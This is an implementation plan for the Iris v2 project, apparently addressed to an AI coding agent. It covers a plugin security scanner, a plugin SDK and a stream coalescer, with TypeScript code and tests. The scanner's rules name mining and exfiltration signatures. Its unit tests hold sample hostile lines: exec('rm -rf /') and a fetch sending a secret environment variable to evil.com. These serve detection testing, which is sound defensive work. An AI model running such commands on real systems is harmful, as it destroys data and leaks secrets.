# Iris v2 Features Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add 8 major features to Iris: Plugin SDK, Security Scanner, Streaming, Usage Tracking, Auto-Reply, Skill Creator, Agent Creator, Canvas+A2UI.

**Architecture:** Plugin SDK is the foundation (everything plugs into it). Security Scanner gates plugin loading. Streaming, Usage, Auto-Reply are independent middleware layers. Skill/Agent creators are tool-server endpoints + OpenCode tools. Canvas is a new channel adapter + HTTP server.

**Tech Stack:** TypeScript, Hono, SQLite, Jiti (dynamic TS loading), Zod, Chart.js/Marked.js (canvas CDN), WebSocket (ws).

**Design doc:** `docs/plans/2026-02-13-iris-v2-features-design.md`

---

## Phase 1: Security Scanner (no dependencies)

### Task 1: Scanner types and rules

**Files:**
- Create: `src/security/scan-types.ts`
- Create: `src/security/scan-rules.ts`
- Test: `test/unit/security-scanner.test.ts`

**Step 1: Write the types**

```typescript
// src/security/scan-types.ts
export type ScanSeverity = "critical" | "warn" | "info";

export interface ScanRule {
  readonly id: string;
  readonly severity: ScanSeverity;
  readonly description: string;
  readonly type: "line" | "source";
  readonly pattern: RegExp;
  readonly context?: RegExp;
  readonly contextType?: "import" | "source";
}

export interface ScanFinding {
  readonly ruleId: string;
  readonly severity: ScanSeverity;
  readonly file: string;
  readonly line: number;
  readonly message: string;
  readonly evidence: string;
}

export interface ScanResult {
  readonly safe: boolean;
  readonly scannedFiles: number;
  readonly findings: ScanFinding[];
  readonly critical: number;
  readonly warn: number;
  readonly info: number;
}
```

**Step 2: Write the rules**

```typescript
// src/security/scan-rules.ts
import type { ScanRule } from "./scan-types.js";

export const SCAN_RULES: readonly ScanRule[] = [
  {
    id: "dangerous-exec",
    severity: "critical",
    description: "Shell command execution detected",
    type: "line",
    pattern: /\b(exec|execSync|spawn|spawnSync|execFile)\s*\(/,
    context: /child_process/,
    contextType: "import",
  },
  {
    id: "dynamic-eval",
    severity: "critical",
    description: "Dynamic code execution (eval/Function constructor)",
    type: "line",
    pattern: /\beval\s*\(|new\s+Function\s*\(/,
  },
  {
    id: "crypto-mining",
    severity: "critical",
    description: "Cryptocurrency mining signatures",
    type: "line",
    pattern: /stratum\+tcp|coinhive|cryptonight|xmrig/i,
  },
  {
    id: "env-harvesting",
    severity: "critical",
    description: "Environment variables accessed near network calls",
    type: "source",
    pattern: /process\.env/,
    context: /\bfetch\b|http\.request|https\.request|axios\b|got\(/,
    contextType: "source",
  },
  {
    id: "data-exfiltration",
    severity: "warn",
    description: "File read combined with network request",
    type: "source",
    pattern: /readFileSync|readFile|createReadStream/,
    context: /\bfetch\b|http\.request|https\.request/,
    contextType: "source",
  },
  {
    id: "obfuscated-code",
    severity: "warn",
    description: "Obfuscated code detected (hex/base64 sequences)",
    type: "line",
    pattern: /(\\x[0-9a-fA-F]{2}){6,}|atob\s*\(.*[A-Za-z0-9+/=]{200,}/,
  },
  {
    id: "suspicious-network",
    severity: "warn",
    description: "WebSocket connection to non-standard port",
    type: "line",
    pattern: /new\s+WebSocket\s*\(\s*['"`]wss?:\/\/[^'"]*:\d{4,5}/,
  },
  {
    id: "global-override",
    severity: "warn",
    description: "Global object or prototype manipulation",
    type: "line",
    pattern: /globalThis\s*[.[=]|Object\.defineProperty\s*\(\s*global/,
  },
  {
    id: "fs-write",
    severity: "info",
    description: "Filesystem write operations",
    type: "line",
    pattern: /writeFileSync|writeFile|appendFile|createWriteStream/,
  },
  {
    id: "dns-lookup",
    severity: "info",
    description: "DNS resolution calls",
    type: "line",
    pattern: /dns\.resolve|dns\.lookup|dns\.reverse/,
  },
] as const;
```

**Step 3: Write the failing test**

```typescript
// test/unit/security-scanner.test.ts
import { describe, it, expect } from "vitest";
import { SecurityScanner } from "../../src/security/scanner.js";

describe("SecurityScanner", () => {
  const scanner = new SecurityScanner();

  it("detects eval as critical", () => {
    const result = scanner.scanSource("const x = eval('1+1');", "test.ts");
    expect(result.length).toBeGreaterThan(0);
    expect(result[0].ruleId).toBe("dynamic-eval");
    expect(result[0].severity).toBe("critical");
  });

  it("detects exec with child_process import as critical", () => {
    const source = 'import { exec } from "child_process";\nexec("rm -rf /");';
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "dangerous-exec")).toBe(true);
  });

  it("ignores exec without child_process import", () => {
    const source = 'const exec = myFunc;\nexec("safe");';
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
  });

  it("detects env harvesting (process.env + fetch)", () => {
    const source = 'const key = process.env.SECRET;\nfetch("https://evil.com?k=" + key);';
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "env-harvesting")).toBe(true);
  });

  it("allows process.env without network calls", () => {
    const source = "const port = process.env.PORT || 3000;";
    const result = scanner.scanSource(source, "test.ts");
    expect(result.some((f) => f.ruleId === "env-harvesting")).toBe(false);
  });

  it("detects crypto mining signatures", () => {
    const result = scanner.scanSource('connect("stratum+tcp://pool.mine.com")', "test.ts");
    expect(result.some((f) => f.ruleId === "crypto-mining")).toBe(true);
  });

  it("returns safe=true for clean code", () => {
    const result = scanner.scanSource('const x = 1 + 2;\nconsole.log(x);', "test.ts");
    expect(result.length).toBe(0);
  });

  it("produces a ScanResult from scanSource", () => {
    const result = scanner.buildResult([
      { ruleId: "dynamic-eval", severity: "critical", file: "t.ts", line: 1, message: "eval", evidence: "eval('x')" },
    ], 1);
    expect(result.safe).toBe(false);
    expect(result.critical).toBe(1);
    expect(result.scannedFiles).toBe(1);
  });
});
```

**Step 4: Run test to verify it fails**

Run: `pnpm test -- test/unit/security-scanner.test.ts`
Expected: FAIL (SecurityScanner not found)

**Step 5: Write the SecurityScanner**

```typescript
// src/security/scanner.ts
import { readdir, readFile, stat } from "node:fs/promises";
import { join, extname, resolve } from "node:path";
import { SCAN_RULES } from "./scan-rules.js";
import type { ScanFinding, ScanResult } from "./scan-types.js";

const SCANNABLE_EXTENSIONS = new Set([".ts", ".js", ".tsx", ".jsx", ".mjs", ".cjs"]);
const MAX_FILE_SIZE = 1_048_576; // 1MB
const MAX_FILES = 500;

export class SecurityScanner {
  scanSource(source: string, filePath: string): ScanFinding[] {
    const findings: ScanFinding[] = [];
    const lines = source.split("\n");
    const matchedRules = new Set<string>();

    // Line rules
    for (const rule of SCAN_RULES) {
      if (rule.type !== "line" || matchedRules.has(rule.id)) continue;
      if (rule.context && rule.contextType === "import" && !rule.context.test(source)) continue;
      for (let i = 0; i < lines.length; i++) {
        if (rule.pattern.test(lines[i])) {
          findings.push({
            ruleId: rule.id,
            severity: rule.severity,
            file: filePath,
            line: i + 1,
            message: rule.description,
            evidence: lines[i].trim().slice(0, 200),
          });
          matchedRules.add(rule.id);
          break;
        }
      }
    }

    // Source rules
    for (const rule of SCAN_RULES) {
      if (rule.type !== "source" || matchedRules.has(rule.id)) continue;
      if (!rule.pattern.test(source)) continue;
      if (rule.context && !rule.context.test(source)) continue;
      // Find first matching line for evidence
      let evidenceLine = 1;
      let evidence = "";
      for (let i = 0; i < lines.length; i++) {
        if (rule.pattern.test(lines[i])) {
          evidenceLine = i + 1;
          evidence = lines[i].trim().slice(0, 200);
          break;
        }
      }
      findings.push({
        ruleId: rule.id,
        severity: rule.severity,
        file: filePath,
        line: evidenceLine,
        message: rule.description,
        evidence,
      });
      matchedRules.add(rule.id);
    }

    return findings;
  }

  buildResult(findings: ScanFinding[], scannedFiles: number): ScanResult {
    const critical = findings.filter((f) => f.severity === "critical").length;
    const warn = findings.filter((f) => f.severity === "warn").length;
    const info = findings.filter((f) => f.severity === "info").length;
    return { safe: critical === 0, scannedFiles, findings, critical, warn, info };
  }

  async scanDirectory(dir: string): Promise<ScanResult> {
    const files = await this.discoverFiles(dir);
    const allFindings: ScanFinding[] = [];
    for (const file of files) {
      try {
        const source = await readFile(file, "utf-8");
        allFindings.push(...this.scanSource(source, file));
      } catch {
        // Skip unreadable files
      }
    }
    return this.buildResult(allFindings, files.length);
  }

  private async discoverFiles(dir: string, collected: string[] = []): Promise<string[]> {
    if (collected.length >= MAX_FILES) return collected;
    const entries = await readdir(dir, { withFileTypes: true });
    for (const entry of entries) {
      if (collected.length >= MAX_FILES) break;
      if (entry.name.startsWith(".") || entry.name === "node_modules") continue;
      const full = join(dir, entry.name);
      if (entry.isDirectory()) {
        await this.discoverFiles(full, collected);
      } else if (SCANNABLE_EXTENSIONS.has(extname(entry.name))) {
        const s = await stat(full);
        if (s.size <= MAX_FILE_SIZE) collected.push(full);
      }
    }
    return collected;
  }
}
```

**Step 6: Run test to verify it passes**

Run: `pnpm test -- test/unit/security-scanner.test.ts`
Expected: PASS (all 8 tests)

**Step 7: Build check**

Run: `pnpm run build`
Expected: Clean

**Step 8: Commit**

```bash
git add src/security/scan-types.ts src/security/scan-rules.ts src/security/scanner.ts test/unit/security-scanner.test.ts
git commit -m "feat(security): add code security scanner with 10 detection rules"
```

---

## Phase 2: Plugin SDK

### Task 2: Plugin types

**Files:**
- Create: `src/plugins/types.ts`

```typescript
// src/plugins/types.ts
import type { z } from "zod";
import type { ChannelAdapter, ChannelAccountConfig } from "../channels/adapter.js";
import type { Logger } from "../logging/logger.js";
import type { IrisConfig } from "../config/types.js";

export interface IrisPlugin {
  readonly id: string;
  readonly name?: string;
  readonly version?: string;
  register(api: IrisPluginApi): void | Promise<void>;
}

export interface IrisPluginApi {
  registerTool(name: string, def: PluginToolDef): void;
  registerChannel(id: string, factory: ChannelFactory): void;
  registerService(name: string, service: PluginService): void;
  registerHook<K extends keyof HookMap>(event: K, handler: HookHandler<K>): void;
  readonly config: Readonly<IrisConfig>;
  readonly logger: Logger;
  readonly stateDir: string;
}

export interface PluginToolDef {
  readonly description: string;
  readonly args: Record<string, z.ZodTypeAny>;
  execute(args: Record<string, unknown>, ctx: ToolExecContext): Promise<unknown>;
}

export interface ToolExecContext {
  readonly sessionId: string | null;
  readonly senderId: string | null;
  readonly channelId: string | null;
  readonly logger: Logger;
}

export type ChannelFactory = (config: ChannelAccountConfig, signal: AbortSignal) => ChannelAdapter;

export interface PluginService {
  start(ctx: ServiceContext): Promise<void>;
  stop(): Promise<void>;
}

export interface ServiceContext {
  readonly config: Readonly<IrisConfig>;
  readonly logger: Logger;
  readonly stateDir: string;
  readonly signal: AbortSignal;
}

// Hook system
export interface HookMap {
  "message.inbound": { message: { channelId: string; senderId: string; text: string } };
  "message.outbound": { channelId: string; chatId: string; text: string };
  "gateway.ready": void;
  "gateway.shutdown": void;
}

export type HookHandler<K extends keyof HookMap> =
  HookMap[K] extends void
    ? () => void | Promise<void>
    : (data: HookMap[K]) => void | Promise<void>;

export interface PluginManifestTool {
  readonly description: string;
  readonly args: Record<string, string>; // Simplified: name -> type string
}

export interface PluginManifest {
  readonly tools: Record<string, PluginManifestTool>;
}
```

Commit: `git add src/plugins/types.ts && git commit -m "feat(plugins): add plugin type definitions"`

### Task 3: HookBus

**Files:**
- Create: `src/plugins/hook-bus.ts`
- Test: `test/unit/hook-bus.test.ts`

**Step 1: Write the failing test**

```typescript
// test/unit/hook-bus.test.ts
import { describe, it, expect, vi } from "vitest";
import { HookBus } from "../../src/plugins/hook-bus.js";

describe("HookBus", () => {
  it("calls handlers in registration order", async () => {
    const bus = new HookBus();
    const order: number[] = [];
    bus.on("gateway.ready", () => { order.push(1); });
    bus.on("gateway.ready", () => { order.push(2); });
    await bus.emit("gateway.ready", undefined as never);
    expect(order).toEqual([1, 2]);
  });

  it("passes data to handlers", async () => {
    const bus = new HookBus();
    const handler = vi.fn();
    bus.on("message.outbound", handler);
    await bus.emit("message.outbound", { channelId: "tg", chatId: "1", text: "hi" });
    expect(handler).toHaveBeenCalledWith({ channelId: "tg", chatId: "1", text: "hi" });
  });

  it("continues on handler error", async () => {
    const bus = new HookBus();
    const handler2 = vi.fn();
    bus.on("gateway.ready", () => { throw new Error("boom"); });
    bus.on("gateway.ready", handler2);
    await bus.emit("gateway.ready", undefined as never);
    expect(handler2).toHaveBeenCalled();
  });

  it("supports removing handlers", () => {
    const bus = new HookBus();
    const handler = vi.fn();
    const unsub = bus.on("gateway.ready", handler);
    unsub();
    bus.emit("gateway.ready", undefined as never);
    expect(handler).not.toHaveBeenCalled();
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

```typescript
// src/plugins/hook-bus.ts
import type { HookMap, HookHandler } from "./types.js";

export class HookBus {
  private handlers = new Map<string, Array<(...args: unknown[]) => unknown>>();

  on<K extends keyof HookMap>(event: K, handler: HookHandler<K>): () => void {
    const list = this.handlers.get(event as string) ?? [];
    list.push(handler as (...args: unknown[]) => unknown);
    this.handlers.set(event as string, list);
    return () => {
      const idx = list.indexOf(handler as (...args: unknown[]) => unknown);
      if (idx >= 0) list.splice(idx, 1);
    };
  }

  async emit<K extends keyof HookMap>(event: K, data: HookMap[K]): Promise<void> {
    const list = this.handlers.get(event as string) ?? [];
    for (const handler of list) {
      try {
        await handler(data);
      } catch {
        // Hooks must not crash the system
      }
    }
  }
}
```

**Step 4: Run test — expect PASS**

**Step 5: Commit**

```bash
git add src/plugins/hook-bus.ts test/unit/hook-bus.test.ts
git commit -m "feat(plugins): add HookBus for plugin event dispatch"
```

### Task 4: PluginRegistry

**Files:**
- Create: `src/plugins/registry.ts`
- Test: `test/unit/plugin-registry.test.ts`

**Step 1: Write the failing test**

```typescript
// test/unit/plugin-registry.test.ts
import { describe, it, expect, vi } from "vitest";
import { PluginRegistry } from "../../src/plugins/registry.js";

describe("PluginRegistry", () => {
  it("registers and retrieves tools", () => {
    const reg = new PluginRegistry();
    const api = reg.createApi("test-plugin", {} as any, console as any, "/tmp");
    api.registerTool("echo", {
      description: "Echo input",
      args: {},
      async execute(args) { return args; },
    });
    expect(reg.tools.has("echo")).toBe(true);
    expect(reg.tools.get("echo")!.description).toBe("Echo input");
  });

  it("registers channels", () => {
    const reg = new PluginRegistry();
    const api = reg.createApi("test", {} as any, console as any, "/tmp");
    const factory = vi.fn();
    api.registerChannel("matrix", factory);
    expect(reg.channels.has("matrix")).toBe(true);
  });

  it("registers services", () => {
    const reg = new PluginRegistry();
    const api = reg.createApi("test", {} as any, console as any, "/tmp");
    api.registerService("notifier", { start: vi.fn(), stop: vi.fn() });
    expect(reg.services.has("notifier")).toBe(true);
  });

  it("registers hooks via hookBus", async () => {
    const reg = new PluginRegistry();
    const api = reg.createApi("test", {} as any, console as any, "/tmp");
    const handler = vi.fn();
    api.registerHook("gateway.ready", handler);
    await reg.hookBus.emit("gateway.ready", undefined as never);
    expect(handler).toHaveBeenCalled();
  });

  it("generates a plugin manifest", () => {
    const reg = new PluginRegistry();
    const api = reg.createApi("test", {} as any, console as any, "/tmp");
    api.registerTool("translate", {
      description: "Translate text",
      args: {},
      async execute() { return {}; },
    });
    const manifest = reg.getManifest();
    expect(manifest.tools.translate).toBeDefined();
    expect(manifest.tools.translate.description).toBe("Translate text");
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

```typescript
// src/plugins/registry.ts
import type { IrisConfig } from "../config/types.js";
import type { Logger } from "../logging/logger.js";
import type {
  IrisPluginApi,
  PluginToolDef,
  ChannelFactory,
  PluginService,
  PluginManifest,
  HookMap,
  HookHandler,
} from "./types.js";
import { HookBus } from "./hook-bus.js";

export class PluginRegistry {
  readonly tools = new Map<string, PluginToolDef>();
  readonly channels = new Map<string, ChannelFactory>();
  readonly services = new Map<string, PluginService>();
  readonly hookBus = new HookBus();

  createApi(
    pluginId: string,
    config: Readonly<IrisConfig>,
    logger: Logger,
    stateDir: string,
  ): IrisPluginApi {
    return {
      registerTool: (name, def) => { this.tools.set(name, def); },
      registerChannel: (id, factory) => { this.channels.set(id, factory); },
      registerService: (name, service) => { this.services.set(name, service); },
      registerHook: <K extends keyof HookMap>(event: K, handler: HookHandler<K>) => {
        this.hookBus.on(event, handler);
      },
      config,
      logger,
      stateDir,
    };
  }

  getManifest(): PluginManifest {
    const tools: PluginManifest["tools"] = {};
    for (const [name, def] of this.tools) {
      const args: Record<string, string> = {};
      for (const [argName, zodType] of Object.entries(def.args)) {
        args[argName] = String((zodType as { _def?: { typeName?: string } })?._def?.typeName ?? "string");
      }
      tools[name] = { description: def.description, args };
    }
    return { tools };
  }
}
```

**Step 4: Run test — expect PASS**

**Step 5: Commit**

```bash
git add src/plugins/registry.ts test/unit/plugin-registry.test.ts
git commit -m "feat(plugins): add PluginRegistry with tool/channel/service/hook registration"
```

### Task 5: PluginLoader (Jiti)

**Files:**
- Create: `src/plugins/loader.ts`
- Test: `test/unit/plugin-loader.test.ts`

**Step 1: Install jiti**

Run: `pnpm add jiti`

**Step 2: Write the failing test**

```typescript
// test/unit/plugin-loader.test.ts
import { describe, it, expect } from "vitest";
import { writeFileSync, mkdirSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { PluginLoader } from "../../src/plugins/loader.js";

describe("PluginLoader", () => {
  const testDir = join(tmpdir(), "iris-plugin-test-" + Date.now());

  it("loads a plugin from a TypeScript file", async () => {
    const pluginDir = join(testDir, "echo");
    mkdirSync(pluginDir, { recursive: true });
    writeFileSync(join(pluginDir, "index.ts"), `
      export default {
        id: "echo",
        name: "Echo Plugin",
        register(api) {
          api.registerTool("echo", {
            description: "Echo back input",
            args: {},
            async execute(args) { return { echo: true }; },
          });
        },
      };
    `);

    const loader = new PluginLoader(console as any);
    const registry = await loader.loadAll(
      { plugins: [pluginDir] } as any,
      testDir,
    );

    expect(registry.tools.has("echo")).toBe(true);
    rmSync(testDir, { recursive: true, force: true });
  });

  it("returns empty registry when no plugins configured", async () => {
    const loader = new PluginLoader(console as any);
    const registry = await loader.loadAll({} as any, testDir);
    expect(registry.tools.size).toBe(0);
  });
});
```

**Step 3: Run test — expect FAIL**

**Step 4: Implement**

```typescript
// src/plugins/loader.ts
import { existsSync } from "node:fs";
import { writeFile, mkdir } from "node:fs/promises";
import { join, resolve } from "node:path";
import { createJiti } from "jiti";
import type { IrisConfig } from "../config/types.js";
import type { Logger } from "../logging/logger.js";
import type { IrisPlugin } from "./types.js";
import { PluginRegistry } from "./registry.js";
import { SecurityScanner } from "../security/scanner.js";

export class PluginLoader {
  private readonly scanner = new SecurityScanner();

  constructor(private readonly logger: Logger) {}

  async loadAll(config: Readonly<IrisConfig>, stateDir: string): Promise<PluginRegistry> {
    const registry = new PluginRegistry();
    const paths = this.discoverPaths(config, stateDir);

    for (const pluginPath of paths) {
      try {
        // Security scan before loading
        const scanResult = await this.scanner.scanDirectory(resolve(pluginPath));
        if (!scanResult.safe) {
          this.logger.warn(
            { path: pluginPath, critical: scanResult.critical },
            "Plugin blocked by security scanner",
          );
          continue;
        }

        const mod = await this.loadModule(pluginPath);
        const plugin = this.resolveExport(mod);
        if (!plugin) {
          this.logger.warn({ path: pluginPath }, "Plugin has no valid export");
          continue;
        }

        const api = registry.createApi(plugin.id, config, this.logger, stateDir);
        await plugin.register(api);
        this.logger.info({ plugin: plugin.id, name: plugin.name }, "Plugin loaded");
      } catch (err) {
        this.logger.error({ err, path: pluginPath }, "Failed to load plugin");
      }
    }

    // Write manifest for OpenCode plugin
    await this.writeManifest(registry, stateDir);

    return registry;
  }

  private discoverPaths(config: Readonly<IrisConfig>, stateDir: string): string[] {
    const paths: string[] = [];

    // Explicit config paths
    if (config.plugins) {
      for (const p of config.plugins) paths.push(resolve(p));
    }

    // Convention directories
    const localPlugins = join(process.cwd(), "plugins");
    const userPlugins = join(stateDir, "plugins");
    for (const dir of [localPlugins, userPlugins]) {
      if (existsSync(dir)) {
        // Each subdirectory is a plugin
        const { readdirSync } = require("node:fs");
        try {
          for (const entry of readdirSync(dir, { withFileTypes: true })) {
            if (entry.isDirectory() && !entry.name.startsWith(".")) {
              paths.push(join(dir, entry.name));
            }
          }
        } catch {
          // Skip unreadable directories
        }
      }
    }

    return paths;
  }

  private async loadModule(pluginPath: string): Promise<unknown> {
    const jiti = createJiti(pluginPath, {
      interopDefault: true,
      moduleCache: false,
    });
    // Try index.ts, then index.js
    for (const name of ["index.ts", "index.js", "index.mjs"]) {
      const full = join(pluginPath, name);
      if (existsSync(full)) {
        return jiti.import(full);
      }
    }
    // Try loading the path directly (if it's a file)
    return jiti.import(pluginPath);
  }

  private resolveExport(mod: unknown): IrisPlugin | null {
    if (!mod || typeof mod !== "object") return null;
    const obj = mod as Record<string, unknown>;
    // Check default export
    if (obj.default && typeof obj.default === "object") {
      const def = obj.default as Record<string, unknown>;
      if (typeof def.id === "string" && typeof def.register === "function") {
        return def as unknown as IrisPlugin;
      }
    }
    // Check module itself
    if (typeof obj.id === "string" && typeof obj.register === "function") {
      return obj as unknown as IrisPlugin;
    }
    return null;
  }

  private async writeManifest(registry: PluginRegistry, stateDir: string): Promise<void> {
    const manifest = registry.getManifest();
    if (Object.keys(manifest.tools).length === 0) return;
    await mkdir(stateDir, { recursive: true });
    await writeFile(
      join(stateDir, "plugin-tools.json"),
      JSON.stringify(manifest, null, 2),
    );
  }
}
```

**Step 5: Run test — expect PASS**

**Step 6: Build check**

Run: `pnpm run build`

**Step 7: Commit**

```bash
git add src/plugins/loader.ts test/unit/plugin-loader.test.ts package.json pnpm-lock.yaml
git commit -m "feat(plugins): add PluginLoader with Jiti + security scanning"
```

### Task 6: Wire Plugin SDK into lifecycle + config

**Files:**
- Modify: `src/config/types.ts` — add `plugins` field
- Modify: `src/config/schema.ts` — add `plugins` Zod schema
- Modify: `src/gateway/lifecycle.ts` — load plugins, wire channels/services/hooks
- Modify: `src/bridge/tool-server.ts` — register plugin tool endpoints

**Step 1: Add config fields**

In `src/config/types.ts`, add to `IrisConfig`:
```typescript
readonly plugins?: string[];
```

In `src/config/schema.ts`, add to `irisConfigSchema`:
```typescript
plugins: z.array(z.string()).optional(),
```

**Step 2: Wire into lifecycle.ts**

After config load (step 2), before security components (step 5):
```typescript
import { PluginLoader } from "../plugins/loader.js";

// 2.5 Load plugins
const pluginRegistry = await new PluginLoader(logger).loadAll(config, stateDir);
```

Merge plugin channels into adapter factories:
```typescript
// Before adapter loop
for (const [id, factory] of pluginRegistry.channels) {
  ADAPTER_FACTORIES[id] = () => {
    // Plugin channels are constructed differently — they need config + signal
    // We'll construct them in the adapter loop below
    throw new Error("Use plugin factory directly");
  };
}
```

Actually, simpler: in the adapter loop, check plugin channels first:
```typescript
const pluginFactory = pluginRegistry.channels.get(channelConfig.type);
const adapter = pluginFactory
  ? pluginFactory(channelConfig, abortController.signal)
  : factory();
```

Pass plugin tools to tool-server:
```typescript
const toolServer = new ToolServer({
  registry, logger, vaultStore, vaultSearch, governanceEngine,
  sessionMap, pluginTools: pluginRegistry.tools,
});
```

Start services after gateway ready:
```typescript
// 13.5 Start plugin services
for (const [name, service] of pluginRegistry.services) {
  try {
    await service.start({ config, logger, stateDir, signal: abortController.signal });
    logger.info({ service: name }, "Plugin service started");
  } catch (err) {
    logger.error({ err, service: name }, "Failed to start plugin service");
  }
}

// Emit gateway.ready hook
await pluginRegistry.hookBus.emit("gateway.ready", undefined as never);
```

In shutdown, stop services and emit hook:
```typescript
await pluginRegistry.hookBus.emit("gateway.shutdown", undefined as never);
for (const [name, service] of pluginRegistry.services) {
  try { await service.stop(); } catch (err) {
    logger.error({ err, service: name }, "Error stopping plugin service");
  }
}
```

**Step 3: Add plugin tool endpoints to tool-server.ts**

Add to `ToolServerDeps`:
```typescript
pluginTools?: Map<string, PluginToolDef> | null;
```

Add field + constructor wiring (same pattern as sessionMap).

Add dynamic route in `setupRoutes()`:
```typescript
// Plugin tool endpoints
this.app.post("/tool/plugin/:name", async (c) => {
  const name = c.req.param("name");
  const toolDef = this.pluginTools?.get(name);
  if (!toolDef) return c.json({ error: `Plugin tool not found: ${name}` }, 404);
  const body = await c.req.json();
  try {
    const result = await toolDef.execute(body, {
      sessionId: body.sessionId ?? null,
      senderId: body.senderId ?? null,
      channelId: body.channelId ?? null,
      logger: this.logger,
    });
    return c.json(result);
  } catch (err) {
    this.logger.error({ err, tool: name }, "Plugin tool execution failed");
    return c.json({ error: String(err) }, 500);
  }
});
```

**Step 4: Build + test**

Run: `pnpm run build && pnpm run test`
Expected: Clean build, all existing tests pass

**Step 5: Commit**

```bash
git add src/config/types.ts src/config/schema.ts src/gateway/lifecycle.ts src/bridge/tool-server.ts
git commit -m "feat(plugins): wire Plugin SDK into lifecycle, config, and tool-server"
```

---

## Phase 3: Streaming + Block Coalescing

### Task 7: StreamCoalescer

**Files:**
- Create: `src/bridge/stream-coalescer.ts`
- Test: `test/unit/stream-coalescer.test.ts`

**Step 1: Write the failing test**

```typescript
// test/unit/stream-coalescer.test.ts
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { StreamCoalescer } from "../../src/bridge/stream-coalescer.js";

describe("StreamCoalescer", () => {
  beforeEach(() => { vi.useFakeTimers(); });
  afterEach(() => { vi.useRealTimers(); });

  it("flushes when buffer exceeds maxChars", () => {
    const onFlush = vi.fn();
    const c = new StreamCoalescer({ enabled: true, minChars: 10, maxChars: 50, idleMs: 1000, breakOn: "word", editInPlace: false }, onFlush);
    c.append("x".repeat(60));
    expect(onFlush).toHaveBeenCalled();
    expect(onFlush.mock.calls[0][0].length).toBeLessThanOrEqual(50);
  });

  it("flushes on idle timer when buffer >= minChars", () => {
    const onFlush = vi.fn();
    const c = new StreamCoalescer({ enabled: true, minChars: 5, maxChars: 1000, idleMs: 500, breakOn: "word", editInPlace: false }, onFlush);
    c.append("Hello world");
    expect(onFlush).not.toHaveBeenCalled();
    vi.advanceTimersByTime(500);
    expect(onFlush).toHaveBeenCalledWith("Hello world", false);
  });

  it("does not flush on idle when buffer < minChars", () => {
    const onFlush = vi.fn();
    const c = new StreamCoalescer({ enabled: true, minChars: 100, maxChars: 1000, idleMs: 500, breakOn: "word", editInPlace: false }, onFlush);
    c.append("Hi");
    vi.advanceTimersByTime(500);
    expect(onFlush).not.toHaveBeenCalled();
  });

  it("end() flushes remaining buffer regardless of minChars", () => {
    const onFlush = vi.fn();
    const c = new StreamCoalescer({ enabled: true, minChars: 100, maxChars: 1000, idleMs: 500, breakOn: "word", editInPlace: false }, onFlush);
    c.append("Short");
    c.end();
    expect(onFlush).toHaveBeenCalledWith("Short", false);
  });

  it("breaks on paragraph boundary", () => {
    const onFlush = vi.fn();
    const c = new StreamCoalescer({ enabled: true, minChars: 5, maxChars: 30, idleMs: 5000, breakOn: "paragraph", editInPlace: false }, onFlush);
    c.append("First paragraph.\n\nSecond paragraph that is longer.");
    // Should flush at paragraph boundary (maxChars=30 forces a split)
    expect(onFlush).toHaveBeenCalled();
  });

  it("passes isEdit=true when editInPlace is enabled and not first flush", () => {
    const onFlush = vi.fn();
    const c = new StreamCoalescer({ enabled: true, minChars: 5, maxChars: 20, idleMs: 5000, breakOn: "word", editInPlace: true }, onFlush);
    c.append("First chunk is here.");
    // First flush — isEdit=false
    expect(onFlush).toHaveBeenCalledWith(expect.any(String), false);
    onFlush.mockClear();
    c.append("Second chunk is here too.");
    // Subsequent — isEdit=true
    expect(onFlush).toHaveBeenCalledWith(expect.any(String), true);
  });
});
```

**Step 2: Run test — expect FAIL**

**Step 3: Implement**

```typescript
// src/bridge/stream-coalescer.ts
export interface CoalescerConfig {
  readonly enabled: boolean;
  readonly minChars: number;
  readonly maxChars: number;
  readonly idleMs: number;
  readonly breakOn: "paragraph" | "sentence" | "word";
  readonly editInPlace: boolean;
}

export const DEFAULT_COALESCER_CONFIG: CoalescerConfig = {
  enabled: false,
  minChars: 300,
  maxChars: 4096,
  idleMs: 800,
  breakOn: "paragraph",
  editInPlace: false,
};

export class StreamCoalescer {
  private buffer = "";
  private fullText = "";
  private idleTimer: ReturnType<typeof setTimeout> | null = null;
  private hasFlushedOnce = false;

  constructor(
    private readonly config: CoalescerConfig,
    private readonly onFlush: (text: string, isEdit: boolean) => void,
  ) {}

  append(delta: string): void {
    this.buffer += delta;
    this.fullText += delta;
    this.resetIdleTimer();

    // Flush if buffer exceeds maxChars
    while (this.buffer.length >= this.config.maxChars) {
      const breakIdx = this.findBreakPoint(this.buffer, this.config.maxChars);
      const chunk = this.buffer.slice(0, breakIdx);
      this.buffer = this.buffer.slice(breakIdx);
      this.doFlush(chunk);
    }
  }

  end(): void {
    this.clearIdleTimer();
    if (this.buffer.length > 0) {
      this.doFlush(this.buffer);
      this.buffer = "";
    }
  }

  dispose(): void {
    this.clearIdleTimer();
  }

  private doFlush(text: string): void {
    if (!text) return;
    const isEdit = this.config.editInPlace && this.hasFlushedOnce;
    const output = isEdit ? this.fullText : text;
    this.hasFlushedOnce = true;
    this.onFlush(output, isEdit);
  }

  private resetIdleTimer(): void {
    this.clearIdleTimer();
    this.idleTimer = setTimeout(() => {
      if (this.buffer.length >= this.config.minChars) {
        this.doFlush(this.buffer);
        this.buffer = "";
      }
    }, this.config.idleMs);
  }

  private clearIdleTimer(): void {
    if (this.idleTimer) {
      clearTimeout(this.idleTimer);
      this.idleTimer = null;
    }
  }

  private findBreakPoint(text: string, maxLen: number): number {
    const chunk = text.slice(0, maxLen);
    if (this.config.breakOn === "paragraph") {
      const idx = chunk.lastIndexOf("\n\n");
      if (idx > 0) return idx + 2;
    }
    if (this.config.breakOn === "paragraph" || this.config.breakOn === "sentence") {
      // Find last sentence end
      const match = chunk.match(/^([\s\S]*[.!?])\s/);
      if (match) return match[1].length + 1;
    }
    // Word boundary
    const idx = chunk.lastIndexOf(" ");
    return idx > 0 ? idx + 1 : maxLen;
  }
}
```

**Step 4: Run test — expect PASS**

**Step 5: Commit**

```bash
git add src/bridge/stream-coalescer.ts test/unit/stream-coalescer.test.ts
